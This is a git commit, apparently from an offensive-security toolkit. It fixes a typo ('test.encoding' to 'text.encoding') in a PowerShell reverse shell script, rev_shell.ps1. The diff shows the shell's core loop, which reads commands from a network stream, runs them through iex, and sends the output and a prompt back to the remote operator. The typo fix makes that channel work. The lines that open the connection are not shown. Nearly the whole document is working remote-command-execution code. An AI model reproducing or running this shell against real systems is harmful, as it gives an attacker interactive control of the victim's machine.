204f032198ee77f7933f6227a5fb4cd034ec8bcc
kmanc <kmancxc@gmail.com>
2021-07-28 09:02:01 -0700

    Typo test!=text

--- scripts/access/rev_shell.ps1
+++ scripts/access/rev_shell.ps1
@@ -10,7 +10,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
     $sendback = (iex $data 2>&1 | Out-String)
     $sendback2 = $sendback + "PS " + (pwd).Path + "> "
-    $sendbyte = ([test.encoding]::ASCII).GetBytes($sendback2)
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
     $stream.Write($sendbyte, 0, $sendback.Length)
     $stream.Flush()
 }
